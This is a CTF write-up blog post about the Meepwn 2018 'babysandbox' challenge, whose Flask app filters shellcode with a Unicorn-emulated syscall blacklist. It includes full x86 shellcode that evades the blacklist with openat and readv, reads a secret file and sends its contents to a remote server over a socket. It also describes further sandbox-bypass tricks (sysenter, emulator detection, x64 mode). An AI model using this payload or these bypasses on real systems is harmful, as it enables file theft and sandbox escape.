---
layout: post
title:  "Meepwn 2018 CTF - babysandbox pwn challenge"
date:   2018-07-26 19:00:00 +0200
tags: ctf pwn sandbox escape shellcode
categories: blogpost
---

## 0x00 Preface
I participated with [Sec.SE CTF team][securityexchangeteam] at [Meepwn 2018 CTF][meepwn2018ctf]. I focussed mainly on the baby pwn challenge. Although I couldn't get the flag during the competition. I think I was close enough to write a blogpost about this.


## 0x01 Reconnaissance
The challenge consisted of a Flask based webapplication. The application had the following endpoints:

- `/source`: for downloading the python [app.py][app.py] source code.
- `/bin`: for downloading the [ELF binary][bin.elf].
- `/exploit`: to deliver a payload via a POST request in order to exploit the service.
- `/`: a simple interface to interact with all above endpoints.

The exploit endpoint is obviously of interest:

{% highlight python %}
@app.route('/exploit', methods=['POST'])
def exploit():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({'result': 'Wrong data!'})
    
    try:
        payload = b64decode(data['payload'].encode())
    except:
        return jsonify({'result': 'Wrong data!'})
    
    test_i386(UC_MODE_32, payload)
    if session['ISBADSYSCALL']:
        return jsonify({'result': 'Bad Syscall!'})
    try:
        run(['nc', 'localhost', '9999'], input=payload, timeout=2, check=True)
    except CalledProcessError:
        return jsonify({'result': 'Error run file!'})
        
    return jsonify({'result': "DONE!"})
{% endhighlight %}

This endpoint accepts a base64 encoded payload, performs a certain test on the payload with `test_i386(UC_MODE_32, payload)`, and if all goes well, passes it to a service listening on `localhost:9999`.

The test consists of a sandbox written with the Unicorn engine. An engine that emulates CPU instructions. The sandbox hooks into all interrupts, if `0x80` is encountered, then it will check the `EAX` register for blacklisted syscalls. If that's the case, the `ISBADSYSCALL` session variable is set to `True` which means that the payload won't be sent to the vulnerable process listening on localhost.

{% highlight python %}
app.secret_key = open('private/secret.txt').read()

ADDRESS = 0x1000000
sys_fork = 2
sys_read = 3
sys_write = 4
sys_open = 5
sys_close = 6
sys_execve = 11
sys_access = 33
sys_dup = 41
sys_dup2 = 63
sys_mmap = 90
sys_munmap = 91
sys_mprotect = 125
sys_sendfile = 187
sys_sendfile64 = 239
BADSYSCALL = [sys_fork, sys_read, sys_write, sys_open, sys_close, sys_execve, sys_access, sys_dup, sys_dup2, sys_mmap, sys_munmap, sys_mprotect, sys_sendfile, sys_sendfile64]

# callback for tracing Linux interrupt
def hook_intr(uc, intno, user_data):
    if intno != 0x80:
        uc.emu_stop()
        return
    eax = uc.reg_read(UC_X86_REG_EAX)
    if eax in BADSYSCALL:
        session['ISBADSYSCALL'] = True
        uc.emu_stop()

def test_i386(mode, code):
    try:
        # Initialize emulator
        mu = Uc(UC_ARCH_X86, mode)

        # map 2MB memory for this emulation
        mu.mem_map(ADDRESS, 2 * 1024 * 1024)

        # write machine code to be emulated to memory
        mu.mem_write(ADDRESS, code)

        # initialize stack
        mu.reg_write(UC_X86_REG_ESP, ADDRESS + 0x200000)

        # handle interrupt ourself
        mu.hook_add(UC_HOOK_INTR, hook_intr)

        # emulate machine code in infinite time
        mu.emu_start(ADDRESS, ADDRESS + len(code))
    except UcError as e:
        print("ERROR: %s" % e)
{% endhighlight %}

At the top of the Flask application, an interesting line `app.secret_key = open('private/secret.txt').read()` hints that we should read a `secret.txt` file in order to get the flag. Opening the binary ELF file with radare2, we get an idea what the binary does:

{% highlight shell %}
➜  baby_sandbox_rev ✗ r2 -A ./bin    # open the ELF binary with radare2 and analyze it
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- The more 'a' you add after 'aa' the more analysis steps are executed.
[0x000005d0]> s main       # seek to main
[0x00000740]> pdf          # print disassembled function
│           ;-- main:
┌ (fcn) sym.main 157
│   sym.main (int arg_4h);
│           ; var int local_ch @ ebp-0xc
│           ; var int local_4h @ ebp-0x4
│           ; arg int arg_4h @ esp+0x4
│           ; XREFS: CALL 0x00000763  CALL 0x0000077b  CALL 0x00000790  CALL 0x000007a1  CALL 0x000007b2  CALL 0x000007c3
│           0x00000740      8d4c2404       lea ecx, [arg_4h]
│           0x00000744      83e4f0         and esp, 0xfffffff0
│           0x00000747      ff71fc         push dword [ecx - 4]
│           0x0000074a      55             push ebp
│           0x0000074b      89e5           mov ebp, esp
│           0x0000074d      51             push ecx
│           0x0000074e      83ec14         sub esp, 0x14
│           0x00000751      83ec08         sub esp, 8
│           0x00000754      6a00           push 0
│           0x00000756      6aff           push 0xffffffffffffffff
│           0x00000758      6a22           push 0x22                   ; '"'
│           0x0000075a      6a07           push 7
│           0x0000075c      6800010000     push 0x100                  ; "`\b"
│           0x00000761      6a00           push 0
│           0x00000763      e8fcffffff     call 0x764                  ; RELOC 32 mmap
│           0x00000768      83c420         add esp, 0x20
│           0x0000076b      8945f4         mov dword [local_ch], eax
│           0x0000076e      83ec04         sub esp, 4
│           0x00000771      6800010000     push 0x100                  ; "`\b"
│           0x00000776      ff75f4         push dword [local_ch]
│           0x00000779      6a00           push 0
│           0x0000077b      e8fcffffff     call 0x77c                  ; RELOC 32 read
│           0x00000780      83c410         add esp, 0x10
│           0x00000783      83ec04         sub esp, 4
│           0x00000786      6a05           push 5
│           0x00000788      6800010000     push 0x100                  ; "`\b"
│           0x0000078d      ff75f4         push dword [local_ch]
│           0x00000790      e8fcffffff     call 0x791                  ; RELOC 32 mprotect
│           0x00000795      83c410         add esp, 0x10
│           0x00000798      a100000000     mov eax, dword [0]          ; RELOC 32
│           0x0000079d      83ec0c         sub esp, 0xc
│           0x000007a0      50             push eax
│           0x000007a1      e8fcffffff     call 0x7a2                  ; RELOC 32 close
│           0x000007a6      83c410         add esp, 0x10
│           0x000007a9      a100000000     mov eax, dword [0]          ; RELOC 32
│           0x000007ae      83ec0c         sub esp, 0xc
│           0x000007b1      50             push eax
│           0x000007b2      e8fcffffff     call 0x7b3                  ; RELOC 32 close
│           0x000007b7      83c410         add esp, 0x10
│           0x000007ba      a100000000     mov eax, dword [0]          ; RELOC 32
│           0x000007bf      83ec0c         sub esp, 0xc
│           0x000007c2      50             push eax
│           0x000007c3      e8fcffffff     call 0x7c4                  ; RELOC 32 close
│           0x000007c8      83c410         add esp, 0x10
│           0x000007cb      8b45f4         mov eax, dword [local_ch]
│           0x000007ce      ffd0           call eax
│           0x000007d0      b800000000     mov eax, 0
│           0x000007d5      8b4dfc         mov ecx, dword [local_4h]
│           0x000007d8      c9             leave
│           0x000007d9      8d61fc         lea esp, [ecx - 4]
└           0x000007dc      c3             ret
[0x00000740]>
{% endhighlight %}

In short, it `mmap`s a region in memory with `(PROT_READ | PROT_WRITE | PROT_EXEC)` attributes, payload is `read` from stdin, `mprotect` is called to remove the `PROT_WRITE` attribute and finally the payload gets executed using `call eax`.


## 0x02 The attack plan
My basic and naïve approach is as follows:
1. Send a base64 encoded shellcode over HTTP.
2. The shellcode should read a file in order to extract the flag.
3. Since the payload is passed to the process without returning its response over HTTP, we need to communicate back the results via another medium. I chose sockets over TCP to send this data back to my server.
4. The shellcode should not use any of the blacklisted syscalls in order to bypass the Unicorn sandbox.
5. Avoid null bytes in the resulting shellcode as it might be interpreted as end of string during the attack.
6. Setup a remote server that listens on a port to receive the response from the shellcode.


## 0x03 The attack
To read the content of a file, we need two syscalls: [`open`][opensyscall] and [`read`][readsyscall]. These two syscalls are not allowed. I found this handy [syscall list][syscalllist] and scrolled through it. The following two syscalls were of interest [`openat`][openatsyscall] and [`readv`][readvsyscall] although they need to be used in a certain way. This took some time to figure out and especially debug. This in combination with socket functions made the assembly code relatively lengthy and challenging for this newbie who's used to write only helloworld assembly programs. Luckily there was enough space for the shellcode so I didn't have to optimize the length of the shellcode too much.

{% highlight nasm %}
BITS 32

section .text
global _start

_start:
    xor eax, eax
    push eax
    push eax
    push 0x7478742e
    push 0x74657263
    push 0x65732f65
    push 0x74617669
    push 0x72702f78
    push 0x6f62646e
    push 0x61737962
    push 0x61622f65
    push 0x6d6f682f ; "/home/babysandbox/private/secret.txt0x00"

    ;int openat(int dirfd, const char *pathname, int flags) syscall 0x127
    mov ax, 0x127
    mov bx, -100   ; AT_FDCWD
    mov ecx, esp   ; from pushes
    xor edx, edx   ; O_RDONLY (0)
    int 0x80

    ; ssize_t readv(int fd, const struct iovec *iov, int iovcnt) syscall 0x91
    mov ebx, eax  ; FD in EBX
    sub esp, 0x78 ; reserve 120 bytes for 
    mov ecx, esp  ;
    mov edi, ecx  ; Save buffer address for later usage
    push 0x78     ; iov_len
    push ecx      ; point to this buffer (*iov_base)
    mov ecx, esp
    push ecx      ; point to iovec struct
    xor eax, eax  
    mov al, 0x91
    inc edx       ; iovcnt = 1
    int 0x80
    mov edx, eax  ; Save the length of the string in edx

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; sockfd = socket(socket_family = 2 (PF_INET), socket_type = 1 (SOCK_STREAM), protocol = 0)
    xor eax, eax
    mov al, 0x66 ; sys_socketcall
    xor ebx, ebx
    push ebx      ; push 0 (protocol)
    inc ebx       ; 
    push ebx      ; socket_type = 1 (SOCK_STREAM)
    inc ebx
    push ebx      ; socket_family = 2 (PF_INET)
    dec ebx       ; SYS_SOCKET ebx = 1 
    mov ecx, esp  ; ecx contains reference to socket arguments we just pushed
    int 0x80
    mov esi, eax  ; Save sockfd

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; connect(sockfd, &sockaddr, addrlen)    
    xor eax, eax
    mov al, 0x66 ; sys_socketcall
    push DWORD 0x0101017f ; 127.1.1.1 to avoid null bytes, replace this with remote server
    push WORD 0x9cad  ; port 44444
    inc ebx      ; AF_INET = 2
    push bx      ; push AF_INET
    mov ecx, esp ; sockaddr pointer
    push BYTE 16 ; sizeof(sockaddr) = 16
    push ecx     ; pointer to sockaddr
    push esi     ; pointer to sockfd
    mov ecx, esp ; socket arguments to socketcall
    inc ebx      ; SYS_CONNECT, ebx = 3
    int 0x80

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; ssize_t send(int sockfd, const void *buf, size_t len, int flags);
    xor eax, eax
    push eax     ; flags = 0
    mov al, 0x66 ; sys_socketcall
    push edx     ; buf_len (previously saved in edx)
    push edi     ; buf
    push esi     ; sockfd
    mov ecx, esp ; socket arguments to socketcall
    mov bl, 0x9  ; SOCKET_SEND
    int 0x80

    ;int exit(0)
    mov al, 1
    xor ebx, ebx
    int 0x80
{% endhighlight %}

The secret file was however not in `/home/babysandbox/private/secret.txt`. I guessed this path since the binary was residing in `/home/babysandbox/babysandbox`. This basically meant I had to write some shellcode to traverse directories a la `ls`. This was not as straightforward as it required some fiddling with the [getdents syscall][getdentssyscall]. This is also where I failed to write proper assembly code as the output was quite giberish as can be seen in the following screenshot:

![missedflag][missedflag]

During the competition, I've missed the flag file residing at `/flag`. I could however find the `secret.txt` file which unfortunately didn't contain the flag. The secret file was related to the [Flask app][flaskapp] itself which was used for crypto purposes. After the competition has ended, I've improved the two assembly programs which can be found at [readdir][readdir] and [readfile][readfile] in order to list a directory and extract the flag properly. The resulting shellcode is null-free:

![nullfree][nullfree]

## 0x04 Conclusion

Although I couldn't extract the flag during the competition, I think the challenge offered some great learning experience. For one, writing the assembly code, diving into linux manuals and debugging the program was worth it. This however kind of made me "stubborn" so to say to suggestions. [Gilles][gilles] pointed out the possibility of using [`sysenter`][sysenter] since the sandbox only checked for `int 0x80`. He even provided a link with a [fully working example][workingsysenter]. I didn't look into this solution as I already spent too much time on my own approach and felt that I was close enough. It turns out that I still had to write the directory listing program from scratch.

Another approach was to use [`execveat`][execveat]. I didn't opt for this solution because I was afraid that the remote server wouldn't support it. According to the documentation:

> VERSIONS
>> execveat() was added to Linux in kernel 3.19. GNU C library support is pending.

> CONFORMING TO
>> The execveat() system call is Linux-specific.

To make things worse, even my own [Vagrant pwnbox][pwnbox] setup didn't support it. I quickly dropped this idea.

After the CTF ended, it is always nice to read other writeups and see how other people solved the challenge. This [particular writeup][externalwriteup] shows how the stack setup is different in the sandbox environment (Unicorn emulator) compared to when its executed outside of it. A simple if statement would allow us to detect whether we're inside a sandbox and exit if that's the case. This means that all the conventional syscalls can be used outside of the sandbox. Another [approach was to switch to x64 mode][x64mode] and use `syscall` instead.

Now you know.


[securityexchangeteam]: https://security.meta.stackexchange.com/questions/1117/a-security-stackexchange-ctf-team
[meepwn2018ctf]: https://ctftime.org/event/625
[app.py]: /assets/files/meepwn2018ctf-babysandbox/app.py
[bin.elf]: /assets/files/meepwn2018ctf-babysandbox/bin.elf
[opensyscall]: http://man7.org/linux/man-pages/man2/open.2.html
[readsyscall]: http://man7.org/linux/man-pages/man2/read.2.html
[syscalllist]: https://syscalls.kernelgrok.com/
[openatsyscall]: http://man7.org/linux/man-pages/man2/openat.2.html
[readvsyscall]: http://man7.org/linux/man-pages/man2/readv.2.html
[getdentssyscall]: http://man7.org/linux/man-pages/man2/getdents.2.html
[flaskapp]: https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key
[missedflag]: /assets/files/meepwn2018ctf-babysandbox/images/missed_flag.png
[readdir]: /assets/files/meepwn2018ctf-babysandbox/readdir.s
[readfile]: /assets/files/meepwn2018ctf-babysandbox/readfile.s
[nullfree]: /assets/files/meepwn2018ctf-babysandbox/images/nullfree.png
[gilles]: https://security.stackexchange.com/users/414/gilles
[sysenter]: https://stackoverflow.com/questions/12806584/what-is-better-int-0x80-or-syscall
[workingsysenter]: https://reverseengineering.stackexchange.com/questions/2869/how-to-use-sysenter-under-linux
[externalwriteup]: https://devel0pment.de/?p=680
[execveat]: http://man7.org/linux/man-pages/man2/execveat.2.html
[pwnbox]: https://github.com/0xM3R/cgPwn
[x64mode]: https://github.com/ssspeedgit00/CTF/tree/master/2018/meepwn/babysandbox